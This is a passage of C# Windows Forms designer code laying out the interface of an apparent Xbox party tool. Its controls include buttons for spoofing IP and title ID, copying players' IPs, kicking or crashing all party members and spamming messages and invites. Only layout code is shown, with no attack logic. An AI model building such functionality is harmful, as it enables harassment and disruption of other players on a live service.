            this.dataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.rlname = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.presencetxt = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.rep = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.followin = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.broadcasting = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dateadd = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.contextMenuStrip3 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripTextBox1 = new System.Windows.Forms.ToolStripTextBox();
            this.metroTabControl1 = new MetroFramework.Controls.MetroTabControl();
            this.metroTabPage6 = new MetroFramework.Controls.MetroTabPage();
            this.metroCheckBox2 = new MetroFramework.Controls.MetroCheckBox();
            this.SpoofedTitleIDBtn = new System.Windows.Forms.Button();
            this.SpoofTitleIDCombo = new MetroFramework.Controls.MetroComboBox();
            this.label13 = new System.Windows.Forms.Label();
            this.SpamMsgBtn = new System.Windows.Forms.Button();
            this.panel16 = new System.Windows.Forms.Panel();
            this.panel15 = new System.Windows.Forms.Panel();
            this.panel14 = new System.Windows.Forms.Panel();
            this.panel13 = new System.Windows.Forms.Panel();
            this.panel12 = new System.Windows.Forms.Panel();
            this.panel11 = new System.Windows.Forms.Panel();
            this.panel10 = new System.Windows.Forms.Panel();
            this.panel9 = new System.Windows.Forms.Panel();
            this.MsgGamertagName = new MetroFramework.Controls.MetroTextBox();
            this.MsgGamertagMsg = new System.Windows.Forms.RichTextBox();
            this.SendMsgBtn = new System.Windows.Forms.Button();
            this.button31 = new System.Windows.Forms.Button();
            this.AvatarChoice = new MetroFramework.Controls.MetroComboBox();
            this.AvitarManifestTxt = new System.Windows.Forms.RichTextBox();
            this.SetAvatarBtn = new System.Windows.Forms.Button();
            this.button30 = new System.Windows.Forms.Button();
            this.button29 = new System.Windows.Forms.Button();
            this.AddXUIDsBtn = new System.Windows.Forms.Button();
            this.AddFriendsBtn = new System.Windows.Forms.Button();
            this.label9 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.button24 = new System.Windows.Forms.Button();
            this.panel8 = new System.Windows.Forms.Panel();
            this.panel7 = new System.Windows.Forms.Panel();
            this.panel6 = new System.Windows.Forms.Panel();
            this.panel5 = new System.Windows.Forms.Panel();
            this.button10 = new System.Windows.Forms.Button();
            this.button23 = new System.Windows.Forms.Button();
            this.richTextBox2 = new System.Windows.Forms.RichTextBox();
            this.sdatxt = new MetroFramework.Controls.MetroTextBox();
            this.label6 = new System.Windows.Forms.Label();
            this.metroTabPage1 = new MetroFramework.Controls.MetroTabPage();
            this.metroTextBox1 = new MetroFramework.Controls.MetroTextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.SpamPartyInvx = new MetroFramework.Controls.MetroCheckBox();
            this.InviteGamertagBtn = new System.Windows.Forms.Button();
            this.SpoofTitleIDBtn = new System.Windows.Forms.Button();
            this.PartyKickByGT = new System.Windows.Forms.Button();
            this.PartyGTTxt = new MetroFramework.Controls.MetroTextBox();
            this.GrabPartyByGT = new System.Windows.Forms.Button();
            this.metroPanel18 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel17 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel16 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel15 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel14 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel13 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel12 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel11 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel10 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel9 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel8 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel7 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel6 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel5 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel4 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel3 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel2 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel1 = new MetroFramework.Controls.MetroPanel();
            this.button22 = new System.Windows.Forms.Button();
            this.button13 = new System.Windows.Forms.Button();
            this.button12 = new System.Windows.Forms.Button();
            this.button11 = new System.Windows.Forms.Button();
            this.DataClients = new System.Windows.Forms.DataGridView();
            this.Gamertag = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.External = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.NADE = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.jointime = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.xuids = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.LabelPartyPrivacy = new System.Windows.Forms.Label();
            this.button8 = new System.Windows.Forms.Button();
            this.metroTabPage2 = new MetroFramework.Controls.MetroTabPage();
            this.button3 = new System.Windows.Forms.Button();
            this.button25 = new System.Windows.Forms.Button();
            this.panel1 = new System.Windows.Forms.Panel();
            this.panel4 = new System.Windows.Forms.Panel();
            this.panel3 = new System.Windows.Forms.Panel();
            this.panel2 = new System.Windows.Forms.Panel();
            this.metroPanel68 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel67 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel66 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel65 = new MetroFramework.Controls.MetroPanel();
            this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
            this.button21 = new System.Windows.Forms.Button();
            this.button20 = new System.Windows.Forms.Button();
            this.button19 = new System.Windows.Forms.Button();
            this.button18 = new System.Windows.Forms.Button();
            this.button17 = new System.Windows.Forms.Button();
            this.button16 = new System.Windows.Forms.Button();
            this.button15 = new System.Windows.Forms.Button();
            this.Ping1 = new MetroFramework.Controls.MetroTextBox();
            this.SpooferPortTextBox = new MetroFramework.Controls.MetroTextBox();
            this.SpooferIPTextBox = new MetroFramework.Controls.MetroTextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.button5 = new System.Windows.Forms.Button();
            this.button4 = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.metroTabPage4 = new MetroFramework.Controls.MetroTabPage();
            this.LoadFollowersBtn = new System.Windows.Forms.Button();
            this.label3 = new System.Windows.Forms.Label();
            this.LoadFriendsBtn = new System.Windows.Forms.Button();
            this.CrashAllx = new MetroFramework.Controls.MetroCheckBox();
            this.KickAllx = new MetroFramework.Controls.MetroCheckBox();
            this.metroPanel42 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel41 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel40 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel39 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel38 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel37 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel36 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel35 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel34 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel33 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel32 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel31 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel30 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel29 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel28 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel27 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel26 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel25 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel24 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel23 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel22 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel21 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel20 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel19 = new MetroFramework.Controls.MetroPanel();
            this.metroTabPage3 = new MetroFramework.Controls.MetroTabPage();
            this.label4 = new System.Windows.Forms.Label();
            this.metroPanel60 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel59 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel58 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel57 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel56 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel55 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel54 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel53 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel52 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel51 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel50 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel49 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel48 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel47 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel46 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel45 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel44 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel43 = new MetroFramework.Controls.MetroPanel();
            this.TextBoxUsername = new MetroFramework.Controls.MetroTextBox();
            this.ClientHistory = new System.Windows.Forms.DataGridView();
            this.dataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.metroTabPage5 = new MetroFramework.Controls.MetroTabPage();
            this.metroPanel61 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel64 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel63 = new MetroFramework.Controls.MetroPanel();
            this.metroPanel62 = new MetroFramework.Controls.MetroPanel();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.metroTabPage7 = new MetroFramework.Controls.MetroTabPage();
            this.metroPanel69 = new MetroFramework.Controls.MetroPanel();
            this.panel20 = new System.Windows.Forms.Panel();
            this.panel19 = new System.Windows.Forms.Panel();
            this.panel18 = new System.Windows.Forms.Panel();
            this.panel17 = new System.Windows.Forms.Panel();
            this.CopyAvatarBtn = new System.Windows.Forms.Button();
            this.SetActivityFeedBtn = new System.Windows.Forms.Button();
            this.label12 = new System.Windows.Forms.Label();
            this.AvatarBtnSet = new System.Windows.Forms.Button();
            this.Avi = new System.Windows.Forms.PictureBox();
            this.XboxProfilePic = new System.Windows.Forms.PictureBox();
            this.ProfileLocation = new MetroFramework.Controls.MetroTextBox();
            this.SetBioBtn = new System.Windows.Forms.Button();
            this.AddFriendBtn = new System.Windows.Forms.Button();
            this.SetLocationBtn = new System.Windows.Forms.Button();
            this.DeleteFriendBtn = new System.Windows.Forms.Button();
            this.label11 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.metroPanel70 = new MetroFramework.Controls.MetroPanel();
            this.GamerScore = new System.Windows.Forms.Label();
            this.XboxOneRep = new System.Windows.Forms.Label();
            this.ProfileGamertag = new System.Windows.Forms.Label();
            this.PresenceText = new System.Windows.Forms.Label();
            this.RealName = new System.Windows.Forms.Label();
            this.PresenceState = new System.Windows.Forms.Label();
            this.DisplayName = new System.Windows.Forms.Label();
            this.BIO = new System.Windows.Forms.RichTextBox();
            this.GamertagProfileLookupName = new MetroFramework.Controls.MetroTextBox();
            this.LookupProfileBtn = new System.Windows.Forms.Button();
            this.ViewMyProfileBtn = new System.Windows.Forms.Button();
            this.metroTabPage8 = new MetroFramework.Controls.MetroTabPage();
            this.metroTabControl2 = new MetroFramework.Controls.MetroTabControl();
            this.metroTabPage9 = new MetroFramework.Controls.MetroTabPage();
            this.ConnectJtagBtn = new System.Windows.Forms.Button();
            this.button9 = new System.Windows.Forms.Button();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.button6 = new System.Windows.Forms.Button();
            this.button7 = new System.Windows.Forms.Button();
            this.metroLabel2 = new MetroFramework.Controls.MetroLabel();
            this.button14 = new System.Windows.Forms.Button();
            this.label7 = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.label5 = new System.Windows.Forms.Label();
            this.metroCheckBox1 = new MetroFramework.Controls.MetroCheckBox();
            this.contextMenuStrip2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DataFriends)).BeginInit();
            this.contextMenuStrip3.SuspendLayout();
            this.metroTabControl1.SuspendLayout();
            this.metroTabPage6.SuspendLayout();
            this.metroTabPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DataClients)).BeginInit();
            this.metroTabPage2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown2)).BeginInit();
            this.metroTabPage4.SuspendLayout();
            this.metroTabPage3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientHistory)).BeginInit();
            this.contextMenuStrip1.SuspendLayout();
            this.metroTabPage5.SuspendLayout();
            this.metroTabPage7.SuspendLayout();
            this.metroPanel69.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Avi)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.XboxProfilePic)).BeginInit();
            this.metroPanel70.SuspendLayout();
            this.metroTabPage8.SuspendLayout();
            this.metroTabControl2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // SpoofIPandPortButton
            // 
            this.SpoofIPandPortButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SpoofIPandPortButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SpoofIPandPortButton.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SpoofIPandPortButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SpoofIPandPortButton.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SpoofIPandPortButton.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SpoofIPandPortButton.Location = new System.Drawing.Point(326, 47);
            this.SpoofIPandPortButton.Name = "SpoofIPandPortButton";
            this.SpoofIPandPortButton.Size = new System.Drawing.Size(320, 50);
            this.SpoofIPandPortButton.TabIndex = 12;
            this.SpoofIPandPortButton.Text = "Spoof IP and Port";
            this.SpoofIPandPortButton.UseVisualStyleBackColor = false;
            this.SpoofIPandPortButton.Click += new System.EventHandler(this.SpoofIPandPortButton_Click);
            // 
            // LabelAuthor
            // 
            this.LabelAuthor.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.LabelAuthor.Font = new System.Drawing.Font("Palatino Linotype", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LabelAuthor.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.LabelAuthor.Location = new System.Drawing.Point(308, 525);
            this.LabelAuthor.Name = "LabelAuthor";
            this.LabelAuthor.Size = new System.Drawing.Size(422, 21);
            this.LabelAuthor.TabIndex = 1;
            this.LabelAuthor.Text = "Ugly ass party tool lmao";
            this.LabelAuthor.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.LabelAuthor.Click += new System.EventHandler(this.LabelAuthor_Click);
            // 
            // ButtonRefreshParty
            // 
            this.ButtonRefreshParty.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.ButtonRefreshParty.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ButtonRefreshParty.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.ButtonRefreshParty.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ButtonRefreshParty.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ButtonRefreshParty.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.ButtonRefreshParty.Location = new System.Drawing.Point(272, 301);
            this.ButtonRefreshParty.Name = "ButtonRefreshParty";
            this.ButtonRefreshParty.Size = new System.Drawing.Size(104, 32);
            this.ButtonRefreshParty.TabIndex = 16;
            this.ButtonRefreshParty.Text = "Refresh Party";
            this.ButtonRefreshParty.UseVisualStyleBackColor = false;
            this.ButtonRefreshParty.Click += new System.EventHandler(this.ButtonRefreshParty_Click);
            // 
            // LabelClientCount
            // 
            this.LabelClientCount.BackColor = System.Drawing.Color.Transparent;
            this.LabelClientCount.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LabelClientCount.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.LabelClientCount.Location = new System.Drawing.Point(435, 275);
            this.LabelClientCount.Name = "LabelClientCount";
            this.LabelClientCount.Size = new System.Drawing.Size(102, 14);
            this.LabelClientCount.TabIndex = 4;
            this.LabelClientCount.Text = "Client Count: 0";
            this.LabelClientCount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // contextMenuStrip2
            // 
            this.contextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem1,
            this.kickToolStripMenuItem});
            this.contextMenuStrip2.Name = "contextMenuStrip2";
            this.contextMenuStrip2.ShowImageMargin = false;
            this.contextMenuStrip2.Size = new System.Drawing.Size(91, 48);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(90, 22);
            this.toolStripMenuItem1.Text = "Copy IP";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
            // 
            // kickToolStripMenuItem
            // 
            this.kickToolStripMenuItem.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.kickToolStripMenuItem.Name = "kickToolStripMenuItem";
            this.kickToolStripMenuItem.Size = new System.Drawing.Size(90, 22);
            this.kickToolStripMenuItem.Text = "Kick";
            this.kickToolStripMenuItem.Click += new System.EventHandler(this.kickToolStripMenuItem_Click);
            // 
            // LabelUsername
            // 
            this.LabelUsername.BackColor = System.Drawing.Color.Transparent;
            this.LabelUsername.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.LabelUsername.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.LabelUsername.Location = new System.Drawing.Point(370, 285);
            this.LabelUsername.Name = "LabelUsername";
            this.LabelUsername.Size = new System.Drawing.Size(245, 23);
            this.LabelUsername.TabIndex = 4;
            this.LabelUsername.Text = "Search";
            this.LabelUsername.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // DataFriends
            // 
            this.DataFriends.AllowUserToAddRows = false;
            this.DataFriends.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DataFriends.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.DataFriends.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.Sunken;
            this.DataFriends.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle1.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataFriends.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle1;
            this.DataFriends.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DataFriends.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn3,
            this.dataGridViewTextBoxColumn4,
            this.rlname,
            this.presencetxt,
            this.rep,
            this.followin,
            this.broadcasting,
            this.dateadd});
            this.DataFriends.ContextMenuStrip = this.contextMenuStrip3;
            dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DataFriends.DefaultCellStyle = dataGridViewCellStyle2;
            this.DataFriends.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DataFriends.EnableHeadersVisualStyles = false;
            this.DataFriends.GridColor = System.Drawing.Color.LightSeaGreen;
            this.DataFriends.Location = new System.Drawing.Point(2, 13);
            this.DataFriends.MultiSelect = false;
            this.DataFriends.Name = "DataFriends";
            this.DataFriends.ReadOnly = true;
            this.DataFriends.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle3.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataFriends.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
            this.DataFriends.RowHeadersVisible = false;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle4.Font = new System.Drawing.Font("Segoe UI", 9F);
            dataGridViewCellStyle4.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            this.DataFriends.RowsDefaultCellStyle = dataGridViewCellStyle4;
            this.DataFriends.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.DataFriends.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DataFriends.Size = new System.Drawing.Size(969, 291);
            this.DataFriends.TabIndex = 18;
            this.DataFriends.CellContentClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.DataFriends_CellContentClick);
            this.DataFriends.CellContentDoubleClick += new System.Windows.Forms.DataGridViewCellEventHandler(this.DataFriends_CellContentDoubleClick);
            // 
            // dataGridViewTextBoxColumn3
            // 
            this.dataGridViewTextBoxColumn3.FillWeight = 140F;
            this.dataGridViewTextBoxColumn3.HeaderText = "Gamertag";
            this.dataGridViewTextBoxColumn3.MinimumWidth = 6;
            this.dataGridViewTextBoxColumn3.Name = "dataGridViewTextBoxColumn3";
            this.dataGridViewTextBoxColumn3.ReadOnly = true;
            this.dataGridViewTextBoxColumn3.Width = 157;
            // 
            // dataGridViewTextBoxColumn4
            // 
            this.dataGridViewTextBoxColumn4.FillWeight = 105F;
            this.dataGridViewTextBoxColumn4.HeaderText = "Online";
            this.dataGridViewTextBoxColumn4.Name = "dataGridViewTextBoxColumn4";
            this.dataGridViewTextBoxColumn4.ReadOnly = true;
            this.dataGridViewTextBoxColumn4.Width = 39;
            // 
            // rlname
            // 
            this.rlname.HeaderText = "Real Name";
            this.rlname.Name = "rlname";
            this.rlname.ReadOnly = true;
            this.rlname.Width = 150;
            // 
            // presencetxt
            // 
            this.presencetxt.HeaderText = "Activity";
            this.presencetxt.Name = "presencetxt";
            this.presencetxt.ReadOnly = true;
            this.presencetxt.Width = 200;
            // 
            // rep
            // 
            this.rep.HeaderText = "Reputation";
            this.rep.Name = "rep";
            this.rep.ReadOnly = true;
            // 
            // followin
            // 
            this.followin.HeaderText = "Follower";
            this.followin.Name = "followin";
            this.followin.ReadOnly = true;
            this.followin.Width = 50;
            // 
            // broadcasting
            // 
            this.broadcasting.HeaderText = "Broadcasting";
            this.broadcasting.Name = "broadcasting";
            this.broadcasting.ReadOnly = true;
            this.broadcasting.Width = 72;
            // 
            // dateadd
            // 
            this.dateadd.HeaderText = "Friend since";
            this.dateadd.Name = "dateadd";
            this.dateadd.ReadOnly = true;
            this.dateadd.Width = 185;
            // 
            // contextMenuStrip3
            // 
            this.contextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem3,
            this.toolStripTextBox1});
            this.contextMenuStrip3.Name = "contextMenuStrip3";
            this.contextMenuStrip3.Size = new System.Drawing.Size(161, 51);
            // 
            // toolStripMenuItem3
            // 
            this.toolStripMenuItem3.Name = "toolStripMenuItem3";
            this.toolStripMenuItem3.Size = new System.Drawing.Size(160, 22);
            this.toolStripMenuItem3.Text = "Inviteuser";
            this.toolStripMenuItem3.Click += new System.EventHandler(this.toolStripMenuItem3_Click);
            // 
            // toolStripTextBox1
            // 
            this.toolStripTextBox1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.toolStripTextBox1.Name = "toolStripTextBox1";
            this.toolStripTextBox1.Size = new System.Drawing.Size(100, 23);
            this.toolStripTextBox1.Click += new System.EventHandler(this.toolStripTextBox1_Click);
            // 
            // metroTabControl1
            // 
            this.metroTabControl1.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.metroTabControl1.Appearance = System.Windows.Forms.TabAppearance.FlatButtons;
            this.metroTabControl1.Controls.Add(this.metroTabPage1);
            this.metroTabControl1.Controls.Add(this.metroTabPage2);
            this.metroTabControl1.Controls.Add(this.metroTabPage4);
            this.metroTabControl1.Controls.Add(this.metroTabPage3);
            this.metroTabControl1.Controls.Add(this.metroTabPage5);
            this.metroTabControl1.Controls.Add(this.metroTabPage6);
            this.metroTabControl1.Controls.Add(this.metroTabPage7);
            this.metroTabControl1.Controls.Add(this.metroTabPage8);
            this.metroTabControl1.HotTrack = true;
            this.metroTabControl1.ItemSize = new System.Drawing.Size(54, 34);
            this.metroTabControl1.Location = new System.Drawing.Point(17, 109);
            this.metroTabControl1.Margin = new System.Windows.Forms.Padding(12);
            this.metroTabControl1.Multiline = true;
            this.metroTabControl1.Name = "metroTabControl1";
            this.metroTabControl1.Padding = new System.Drawing.Point(6, 8);
            this.metroTabControl1.SelectedIndex = 0;
            this.metroTabControl1.Size = new System.Drawing.Size(977, 414);
            this.metroTabControl1.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabControl1.TabIndex = 19;
            this.metroTabControl1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.metroTabControl1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroTabPage6
            // 
            this.metroTabPage6.Controls.Add(this.metroCheckBox2);
            this.metroTabPage6.Controls.Add(this.SpoofedTitleIDBtn);
